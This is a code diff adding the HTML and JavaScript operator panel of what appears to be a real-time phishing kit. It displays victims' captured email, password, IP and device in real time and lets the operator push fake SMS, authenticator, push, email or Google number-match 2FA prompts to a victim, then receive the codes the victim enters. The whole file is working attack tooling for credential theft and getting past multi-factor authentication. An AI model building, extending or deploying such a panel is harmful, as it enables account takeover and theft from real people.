@@ -1,0 +1,857 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Panel</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;500&family=Inter:wght@400;500;600&display=swap');
+
+        *,
+        *::before,
+        *::after {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0
+        }
+
+        :root {
+            --bg: #080808;
+            --surface: #111;
+            --surface2: #181818;
+            --border: #222;
+            --border2: #2a2a2a;
+            --text: #e8e8e8;
+            --muted: #555;
+            --muted2: #888;
+            --blue: #8ab4f8;
+            --green: #34A853;
+            --red: #EA4335;
+            --yellow: #FBBC05;
+            --purple: #c084fc
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            min-height: 100vh;
+            padding: 20px
+        }
+
+        /* Header */
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 20px;
+            padding-bottom: 16px;
+            border-bottom: 1px solid var(--border)
+        }
+
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 12px
+        }
+
+        .logo {
+            font-size: 18px;
+            font-weight: 600;
+            color: #fff;
+            letter-spacing: -0.5px
+        }
+
+        .badge {
+            font-size: 11px;
+            padding: 2px 8px;
+            border-radius: 20px;
+            font-weight: 500
+        }
+
+        .badge.online {
+            background: rgba(52, 168, 83, 0.15);
+            color: var(--green);
+            border: 1px solid rgba(52, 168, 83, 0.3)
+        }
+
+        .badge.offline {
+            background: rgba(234, 67, 53, 0.15);
+            color: var(--red);
+            border: 1px solid rgba(234, 67, 53, 0.3)
+        }
+
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            flex-shrink: 0
+        }
+
+        .timer-badge {
+            font-family: 'Roboto Mono', monospace;
+            font-size: 12px;
+            color: var(--muted2);
+            background: var(--surface);
+            border: 1px solid var(--border2);
+            padding: 5px 12px;
+            border-radius: 6px;
+            white-space: nowrap
+        }
+
+        .btn-clear {
+            background: rgba(234, 67, 53, 0.1);
+            color: var(--red);
+            border: 1px solid rgba(234, 67, 53, 0.2);
+            padding: 5px 12px;
+            border-radius: 6px;
+            font-size: 12px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+            font-family: inherit;
+            white-space: nowrap
+        }
+
+        .btn-clear:hover {
+            background: rgba(234, 67, 53, 0.2)
+        }
+
+        /* Grid */
+        .grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px
+        }
+
+        .full {
+            grid-column: 1/-1
+        }
+
+        @media(max-width:768px) {
+            .grid {
+                grid-template-columns: 1fr
+            }
+        }
+
+        /* Cards */
+        .card {
+            background: var(--surface);
+            border: 1px solid var(--border2);
+            border-radius: 12px;
+            padding: 18px
+        }
+
+        .card-title {
+            font-size: 10px;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            color: var(--muted);
+            margin-bottom: 14px;
+            font-weight: 600
+        }
+
+        /* Credential fields */
+        .cred-field {
+            margin-bottom: 14px
+        }
+
+        .cred-label {
+            font-size: 10px;
+            color: var(--muted);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 5px
+        }
+
+        .cred-value-row {
+            display: flex;
+            align-items: center;
+            gap: 8px
+        }
+
+        .cred-value {
+            font-family: 'Roboto Mono', monospace;
+            font-size: 16px;
+            color: var(--blue);
+            word-break: break-all;
+            flex: 1;
+            min-height: 22px
+        }
+
+        .cred-value.empty {
+            color: var(--muted);
+            font-style: italic;
+            font-size: 13px
+        }
+
+        .copy-btn {
+            background: var(--surface2);
+            border: 1px solid var(--border2);
+            color: var(--muted2);
+            padding: 4px 8px;
+            border-radius: 5px;
+            font-size: 11px;
+            cursor: pointer;
+            transition: all 0.2s;
+            white-space: nowrap;
+            font-family: inherit
+        }
+
+        .copy-btn:hover {
+            border-color: var(--blue);
+            color: var(--blue)
+        }
+
+        .copy-btn.copied {
+            border-color: var(--green);
+            color: var(--green)
+        }
+
+        /* Stats row */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-top: 4px
+        }
+
+        .stat-item {
+            background: var(--surface2);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 10px
+        }
+
+        .stat-label {
+            font-size: 10px;
+            color: var(--muted);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 4px
+        }
+
+        .stat-value {
+            font-family: 'Roboto Mono', monospace;
+            font-size: 12px;
+            color: var(--muted2);
+            word-break: break-all
+        }
+
+        .stat-value.highlight {
+            color: var(--text)
+        }
+
+        /* Device badge */
+        .device-row {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+            margin-top: 10px
+        }
+
+        .tag {
+            font-size: 11px;
+            padding: 3px 10px;
+            border-radius: 20px;
+            font-weight: 500
+        }
+
+        .tag.mobile {
+            background: rgba(192, 132, 252, 0.1);
+            color: var(--purple);
+            border: 1px solid rgba(192, 132, 252, 0.2)
+        }
+
+        .tag.desktop {
+            background: rgba(138, 180, 248, 0.1);
+            color: var(--blue);
+            border: 1px solid rgba(138, 180, 248, 0.2)
+        }
+
+        .tag.unknown {
+            background: var(--surface2);
+            color: var(--muted2);
+            border: 1px solid var(--border)
+        }
+
+        /* SID */
+        .sid-row {
+            margin-top: 12px;
+            padding-top: 12px;
+            border-top: 1px solid var(--border)
+        }
+
+        .sid-val {
+            font-family: 'Roboto Mono', monospace;
+            font-size: 11px;
+            color: var(--muted)
+        }
+
+        /* 2FA buttons */
+        .variant-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 8px
+        }
+
+        .variant-btn {
+            background: var(--surface2);
+            border: 1px solid var(--border2);
+            border-radius: 8px;
+            padding: 12px 14px;
+            font-family: inherit;
+            font-size: 12px;
+            font-weight: 500;
+            color: var(--text);
+            cursor: pointer;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            gap: 8px
+        }
+
+        .variant-btn:hover {
+            background: #222;
+            border-color: var(--blue);
+            color: var(--blue)
+        }
+
+        .variant-btn:active {
+            transform: scale(0.97)
+        }
+
+        .variant-btn:disabled {
+            opacity: 0.3;
+            cursor: not-allowed
+        }
+
+        .variant-btn svg {
+            width: 18px;
+            height: 18px;
+            fill: currentColor;
+            flex-shrink: 0
+        }
+
+        .variant-btn.full {
+            grid-column: 1/-1
+        }
+
+        .variant-btn.active {
+            border-color: var(--green) !important;
+            background: rgba(52, 168, 83, 0.08) !important;
+            color: var(--green) !important
+        }
+
+        /* Code display */
+        .code-box {
+            background: var(--surface2);
+            border: 2px solid var(--border2);
+            border-radius: 10px;
+            padding: 28px;
+            text-align: center;
+            min-height: 90px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s
+        }
+
+        .code-box.has-code {
+            border-color: var(--green);
+            background: rgba(52, 168, 83, 0.04)
+        }
+
+        .code-val {
+            font-family: 'Roboto Mono', monospace;
+            font-size: 14px;
+            color: var(--muted);
+            font-style: italic
+        }
+
+        .code-val.highlight {
+            color: var(--green);
+            font-size: 36px;
+            font-weight: 700;
+            letter-spacing: 6px;
+            font-style: normal
+        }
+
+        /* Match input */
+        .match-area {
+            display: none;
+            background: var(--surface2);
+            border: 2px solid var(--border2);
+            border-radius: 10px;
+            padding: 28px;
+            text-align: center
+        }
+
+        .match-area label {
+            font-size: 13px;
+            color: var(--muted2);
+            display: block;
+            margin-bottom: 14px
+        }
+
+        .match-row {
+            display: flex;
+            gap: 10px;
+            justify-content: center
+        }
+
+        .match-input {
+            width: 110px;
+            padding: 10px;
+            border: 1px solid #444;
+            background: #0f0f0f;
+            color: #fff;
+            border-radius: 6px;
+            outline: none;
+            font-size: 28px;
+            font-family: 'Roboto Mono', monospace;
+            text-align: center
+        }
+
+        .match-input:focus {
+            border-color: var(--blue)
+        }
+
+        .match-send {
+            background: var(--green);
+            color: #000;
+            border: none;
+            padding: 0 20px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: 600;
+            font-family: inherit;
+            transition: opacity 0.2s
+        }
+
+        .match-send:hover {
+            opacity: 0.85
+        }
+
+        /* Log */
+        .log-wrap {
+            max-height: 220px;
+            overflow-y: auto;
+            background: var(--surface2);
+            border-radius: 8px;
+            padding: 10px
+        }
+
+        .log-entry {
+            padding: 5px 0;
+            border-bottom: 1px solid var(--border);
+            line-height: 1.6;
+            font-family: 'Roboto Mono', monospace;
+            font-size: 11px
+        }
+
+        .log-entry:last-child {
+            border-bottom: none
+        }
+
+        .log-time {
+            color: var(--muted)
+        }
+
+        .log-event {
+            font-weight: 600
+        }
+
+        .log-event.CONNECTED {
+            color: var(--green)
+        }
+
+        .log-event.DISCONNECTED {
+            color: var(--red)
+        }
+
+        .log-event.EMAIL {
+            color: var(--blue)
+        }
+
+        .log-event.PASSWORD {
+            color: var(--yellow)
+        }
+
+        .log-event.CODE {
+            color: var(--green)
+        }
+
+        .log-event.VARIANT {
+            color: var(--purple)
+        }
+
+        .log-event.READY {
+            color: var(--yellow)
+        }
+
+        .log-event.SYSTEM {
+            color: var(--muted2)
+        }
+
+        .log-data {
+            color: var(--muted2)
+        }
+
+        .log-wrap::-webkit-scrollbar {
+            width: 4px
+        }
+
+        .log-wrap::-webkit-scrollbar-track {
+            background: transparent
+        }
+
+        .log-wrap::-webkit-scrollbar-thumb {
+            background: var(--border2);
+            border-radius: 2px
+        }
+
+        /* Notification toast */
+        .toast {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: #1a1a1a;
+            border: 1px solid var(--green);
+            border-radius: 8px;
+            padding: 12px 18px;
+            font-size: 13px;
+            color: var(--green);
+            z-index: 9999;
+            transform: translateX(calc(100% + 40px));
+            transition: transform 0.3s ease;
+            max-width: 280px;
+            pointer-events: none
+        }
+
+        .toast.show {
+            transform: translateX(0);
+            pointer-events: auto
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="header">
+        <div class="header-left">
+            <div class="logo">⬡ Admin Panel</div>
+            <span class="badge offline" id="statusBadge">Offline</span>
+        </div>
+        <div class="header-right">
+            <div class="timer-badge" id="timerDisplay">00:00:00</div>
+            <button class="btn-clear" onclick="clearSession()">Clear</button>
+        </div>
+    </div>
+
+    <div class="grid">
+
+        <!-- Credentials -->
+        <div class="card">
+            <div class="card-title">Captured Credentials</div>
+            <div class="cred-field">
+                <div class="cred-label">Email</div>
+                <div class="cred-value-row">
+                    <div class="cred-value empty" id="displayEmail">Waiting...</div>
+                    <button class="copy-btn" onclick="copyField('displayEmail', this)">Copy</button>
+                </div>
+            </div>
+            <div class="cred-field">
+                <div class="cred-label">Password</div>
+                <div class="cred-value-row">
+                    <div class="cred-value empty" id="displayPassword">Waiting...</div>
+                    <button class="copy-btn" onclick="copyField('displayPassword', this)">Copy</button>
+                </div>
+            </div>
+            <div class="sid-row">
+                <div class="cred-label">Session ID</div>
+                <div class="sid-val" id="displaySID">—</div>
+            </div>
+        </div>
+
+        <!-- Stats -->
+        <div class="card">
+            <div class="card-title">Session Info</div>
+            <div class="stats-grid">
+                <div class="stat-item">
+                    <div class="stat-label">IP Address</div>
+                    <div class="stat-value" id="displayIP">—</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-label">Device Type</div>
+                    <div class="stat-value highlight" id="displayDevice">—</div>
+                </div>
+                <div class="stat-item" style="grid-column:1/-1">
+                    <div class="stat-label">User Agent</div>
+                    <div class="stat-value" id="displayUA" style="font-size:10px;line-height:1.5">—</div>
+                </div>
+            </div>
+            <div class="device-row" id="deviceTags"></div>
+        </div>
+
+        <!-- 2FA -->
+        <div class="card">
+            <div class="card-title">Push 2FA Step</div>
+            <div class="variant-grid">
+                <button class="variant-btn" id="btnSMS" disabled onclick="selectVariant('sms')">
+                    <svg viewBox="0 0 24 24">
+                        <path
+                            d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-2 12H6v-2h12v2zm0-3H6V9h12v2zm0-3H6V6h12v2z" />
+                    </svg>
+                    SMS Code
+                </button>
+                <button class="variant-btn" id="btnAuth" disabled onclick="selectVariant('auth')">
+                    <svg viewBox="0 0 24 24">
+                        <path
+                            d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z" />
+                    </svg>
+                    Authenticator
+                </button>
+                <button class="variant-btn" id="btnPrompt" disabled onclick="selectVariant('prompt')">
+                    <svg viewBox="0 0 24 24">
+                        <path
+                            d="M17 1.01L7 1c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-1.99zM17 19H7V5h10v14z" />
+                    </svg>
+                    Push Notification
+                </button>
+                <button class="variant-btn" id="btnEmail" disabled onclick="selectVariant('email')">
+                    <svg viewBox="0 0 24 24">
+                        <path
+                            d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z" />
+                    </svg>
+                    Email Code
+                </button>
+                <button class="variant-btn full" id="btnMatch" disabled onclick="toggleMatchInput()">
+                    <svg viewBox="0 0 24 24">
+                        <path
+                            d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" />
+                    </svg>
+                    Number Match
+                </button>
+            </div>
+        </div>
+
+        <!-- Code -->
+        <div class="card">
+            <div class="card-title" id="codeCardTitle">Received Code</div>
+            <div class="code-box" id="codeDisplay">
+                <div class="code-val" id="displayCode">No code yet</div>
+            </div>
+            <div class="match-area" id="matchInputArea">
+                <label>Enter the number Google showed you:</label>
+                <div class="match-row">
+                    <input type="text" id="matchNumber" class="match-input" maxlength="3">
+                    <button class="match-send" onclick="sendMatch()">Send</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Log -->
+        <div class="card full">
+            <div class="card-title">Event Log</div>
+            <div class="log-wrap" id="logContainer">
+                <div class="log-entry"><span class="log-time">[--:--:--] </span><span class="log-event SYSTEM">SYSTEM
+                    </span><span class="log-data">Panel initialized...</span></div>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- Toast -->
+    <div class="toast" id="toast"></div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.4/socket.io.min.js"></script>
+    <script>
+        const socket = io();
+        let currentSID = '';
+        let timerInterval = null;
+        let timerStart = null;
+
+        // ── Timer ──
+        function startTimer() {
+            if (timerInterval) return;
+            timerStart = Date.now();
+            timerInterval = setInterval(() => {
+                const s = Math.floor((Date.now() - timerStart) / 1000);
+                const h = String(Math.floor(s / 3600)).padStart(2, '0');
+                const m = String(Math.floor((s % 3600) / 60)).padStart(2, '0');
+                const sec = String(s % 60).padStart(2, '0');
+                document.getElementById('timerDisplay').textContent = h + ':' + m + ':' + sec;
+            }, 1000);
+        }
+
+        // ── Toast ──
+        function showToast(msg) {
+            const t = document.getElementById('toast');
+            t.textContent = msg;
+            t.classList.add('show');
+            setTimeout(() => t.classList.remove('show'), 3500);
+        }
+
+        // ── Sound ──
+        function playBeep() {
+            try {
+                const ctx = new (window.AudioContext || window.webkitAudioContext)();
+                const o = ctx.createOscillator();
+                const g = ctx.createGain();
+                o.connect(g); g.connect(ctx.destination);
+                o.frequency.value = 880;
+                g.gain.setValueAtTime(0.3, ctx.currentTime);
+                g.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.4);
+                o.start(ctx.currentTime); o.stop(ctx.currentTime + 0.4);
+            } catch (e) { }
+        }
+
+        // ── Copy ──
+        function copyField(id, btn) {
+            const val = document.getElementById(id).textContent;
+            if (!val || val === 'Waiting...') return;
+            navigator.clipboard.writeText(val).then(() => {
+                btn.textContent = 'Copied!';
+                btn.classList.add('copied');
+                setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
+            });
+        }
+
+        // ── Clear ──
+        function clearSession() {
+            currentSID = '';
+            clearInterval(timerInterval); timerInterval = null;
+            document.getElementById('timerDisplay').textContent = '00:00:00';
+            ['displayEmail', 'displayPassword'].forEach(id => {
+                const el = document.getElementById(id);
+                el.textContent = 'Waiting...'; el.classList.add('empty');
+            });
+            document.getElementById('displayIP').textContent = '—';
+            document.getElementById('displayUA').textContent = '—';
+            document.getElementById('displayDevice').textContent = '—';
+            document.getElementById('deviceTags').innerHTML = '';
+            document.getElementById('displaySID').textContent = '—';
+            document.getElementById('displayCode').textContent = 'No code yet';
+            document.getElementById('displayCode').className = 'code-val';
+            document.getElementById('codeDisplay').classList.remove('has-code');
+            document.getElementById('codeDisplay').style.display = 'flex';
+            document.getElementById('matchInputArea').style.display = 'none';
+            document.querySelectorAll('.variant-btn').forEach(b => { b.disabled = true; b.className = b.className.replace(' active', ''); b.style.cssText = ''; });
+            document.getElementById('logContainer').innerHTML = '<div class="log-entry"><span class="log-time">[--:--:--] </span><span class="log-event SYSTEM">SYSTEM </span><span class="log-data">Session cleared.</span></div>';
+        }
+
+        // ── Device detection ──
+        function parseDevice(ua) {
+            ua = ua.toLowerCase();
+            const tags = [];
+            if (/android/.test(ua)) tags.push({ label: 'Android', cls: 'mobile' });
+            else if (/iphone|ipad/.test(ua)) tags.push({ label: 'iOS', cls: 'mobile' });
+            else if (/windows/.test(ua)) tags.push({ label: 'Windows', cls: 'desktop' });
+            else if (/mac os/.test(ua)) tags.push({ label: 'macOS', cls: 'desktop' });
+            else if (/linux/.test(ua)) tags.push({ label: 'Linux', cls: 'desktop' });
+            if (/mobile|android|iphone/.test(ua)) tags.push({ label: 'Mobile', cls: 'mobile' });
+            else tags.push({ label: 'Desktop', cls: 'desktop' });
+            if (/chrome/.test(ua) && !/edge/.test(ua)) tags.push({ label: 'Chrome', cls: 'unknown' });
+            else if (/firefox/.test(ua)) tags.push({ label: 'Firefox', cls: 'unknown' });
+            else if (/safari/.test(ua)) tags.push({ label: 'Safari', cls: 'unknown' });
+            return tags;
+        }
+
+        // ── Socket events ──
+        socket.on('connect', () => {
+            document.getElementById('statusBadge').textContent = 'Online';
+            document.getElementById('statusBadge').className = 'badge online';
+            socket.emit('join_admin');
+            addLog('CONNECTED', 'Admin panel connected');
+        });
+
+        socket.on('disconnect', () => {
+            document.getElementById('statusBadge').textContent = 'Offline';
+            document.getElementById('statusBadge').className = 'badge offline';
+            addLog('DISCONNECTED', 'Connection lost');
+        });
+
+        socket.on('data_received', data => {
+            currentSID = data.sid || '';
+            if (data.email) {
+                const el = document.getElementById('displayEmail');
+                el.textContent = data.email; el.classList.remove('empty');
+                addLog('EMAIL', data.email);
+                playBeep(); showToast('Email captured: ' + data.email);
+                startTimer();
+            }
+            if (data.password) {
+                const el = document.getElementById('displayPassword');
+                el.textContent = data.password; el.classList.remove('empty');
+                addLog('PASSWORD', '●'.repeat(data.password.length) + ' (' + data.password + ')');
+                playBeep(); showToast('Password captured!');
+            }
+            if (data.ip) { document.getElementById('displayIP').textContent = data.ip; }
+            if (data.user_agent) {
+                const ua = data.user_agent;
+                document.getElementById('displayUA').textContent = ua;
+                const tags = parseDevice(ua);
+                document.getElementById('displayDevice').textContent = /mobile|android|iphone/i.test(ua) ? 'Mobile' : 'Desktop';
+                document.getElementById('deviceTags').innerHTML = tags.map(t => `<span class="tag ${t.cls}">${t.label}</span>`).join('');
+            }
+            document.getElementById('displaySID').textContent = currentSID;
+            if (data.step === 'password_submitted') {
+                document.querySelectorAll('.variant-btn').forEach(b => b.disabled = false);
+                addLog('READY', 'User at processing screen — push a 2FA variant');
+            }
+        });
+
+        socket.on('code_received', data => {
+            const el = document.getElementById('displayCode');
+            el.textContent = data.code; el.classList.remove('code-val'); el.className = 'code-val highlight';
+            document.getElementById('codeDisplay').classList.add('has-code');
+            addLog('CODE', data.code + ' from ' + (data.email || 'unknown'));
+            playBeep(); showToast('Code received: ' + data.code);
+        });
+
+        // ── Variant selection ──
+        function selectVariant(type) {
+            document.getElementById('codeCardTitle').textContent = 'Received Code';
+            document.getElementById('codeDisplay').style.display = 'flex';
+            document.getElementById('matchInputArea').style.display = 'none';
+            socket.emit('select_variant', { type, sid: currentSID });
+            addLog('VARIANT', 'Pushed "' + type + '" to user');
+            document.querySelectorAll('.variant-btn').forEach(b => b.classList.remove('active'));
+            const map = { sms: 'btnSMS', auth: 'btnAuth', prompt: 'btnPrompt', email: 'btnEmail' };
+            if (map[type]) document.getElementById(map[type]).classList.add('active');
+        }
+
+        function toggleMatchInput() {
+            document.querySelectorAll('.variant-btn').forEach(b => b.classList.remove('active'));
+            document.getElementById('btnMatch').classList.add('active');
+            document.getElementById('codeCardTitle').textContent = 'Number Match';
+            document.getElementById('codeDisplay').style.display = 'none';
+            document.getElementById('matchInputArea').style.display = 'block';
+            document.getElementById('matchNumber').focus();
+        }
+
+        function sendMatch() {
+            const num = document.getElementById('matchNumber').value.trim();
+            if (!num) return;
+            socket.emit('select_variant', { type: 'match', sid: currentSID, number: num });
+            addLog('VARIANT', 'Pushed match number: ' + num);
+            document.getElementById('matchNumber').value = '';
+        }
+
+        // ── Log ──
+        function addLog(event, data) {
+            const t = new Date().toTimeString().split(' ')[0];
+            const c = document.getElementById('logContainer');
+            const e = document.createElement('div');
+            e.className = 'log-entry';
+            e.innerHTML = `<span class="log-time">[${t}] </span><span class="log-event ${event}">${event} </span><span class="log-data">${data}</span>`;
+            c.appendChild(e);
+            c.scrollTop = c.scrollHeight;
+        }
+    </script>
+</body>
+
+</html>
